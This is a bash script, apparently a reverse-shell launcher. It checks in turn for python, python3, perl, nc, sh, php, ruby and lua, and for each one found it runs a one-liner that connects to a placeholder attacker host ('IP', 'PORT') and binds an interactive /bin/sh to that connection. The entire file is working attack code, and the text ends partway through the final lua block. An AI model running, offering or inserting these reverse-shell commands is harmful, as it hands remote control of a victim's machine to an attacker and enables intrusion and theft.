#!/bin/bash

if command -v python > /dev/null 2>&1; then
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); 
p=subprocess.call(["/bin/sh","-i"]);'
    exit;
fi

if command -v python3 > /dev/null 2>&1; then
    python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); 
p=subprocess.call(["/bin/sh","-i"]);'
    exit;
fi

if command -v perl > /dev/null 2>&1; then
    perl -e 'use 
Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh 
-i");};'
    exit;
fi

if command -v nc > /dev/null 2>&1; then
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
    exit;
fi

if command -v sh > /dev/null 2>&1; then
    /bin/sh -i >& /dev/tcp/IP/PORT 0>&1
    exit;
fi

if command -v php > /dev/null 2>&1; then
    php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
    exit;
fi

if command -v ruby > /dev/null 2>&1; then
    ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    exit;
fi

if command -v lua > /dev/null 2>&1; then
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('IP','PORT');os.execute('/bin/sh -i <&3 >&3 
2>&3');"
    exit;
